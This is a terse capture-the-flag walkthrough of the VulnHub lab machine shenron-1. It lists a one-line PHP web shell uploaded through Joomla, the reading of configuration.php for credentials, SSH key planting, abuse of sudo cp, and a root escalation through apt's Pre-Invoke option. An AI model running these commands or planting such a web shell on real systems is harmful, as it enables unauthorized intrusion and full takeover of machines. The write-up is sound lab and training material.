## shenron-1

### https://www.vulnhub.com/entry/shenron-1,630/

- /test/password contains login and password in source code: "admin:3iqtzi4RhkWANcu@$pa$$"
- using gobuster we can notice /joomla url
- in admin panel we can upload shell.php:

`<?php echo shell_exec($_GET['cmd']); ?>`

- By execution **cat ../../configuration.php** in our shell, we can find user and password: "jenny:Mypa$$wordi$notharD@123"
- Now we can access jenny account: **shell.php?cmd=(echo 'Mypa$$wordi$notharD@123' | su - jenny -c "whoami") > result.txt &**. Next **shell.php?cmd=cat result.txt**
- Next we need create ssh key and .pub file's content paste into /home/jenny/.ssh/authorized\_keys and login with ssh as jenny (dont forget to encode public key)
- By typing **sudo -l** we can notice, that we can use **cp** as shenron. Using this command we need to copy authorized\_key into /home/shenron/.ssh/authorized\_keys and connect with ssh as shenron
- In /home/shenron we can find first flag
- Next by searching in folders, we can find /var/opt/password.txt - password of shenron
- Next using password, run: **sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh**
- Run: cat /root/root.txt - second flag
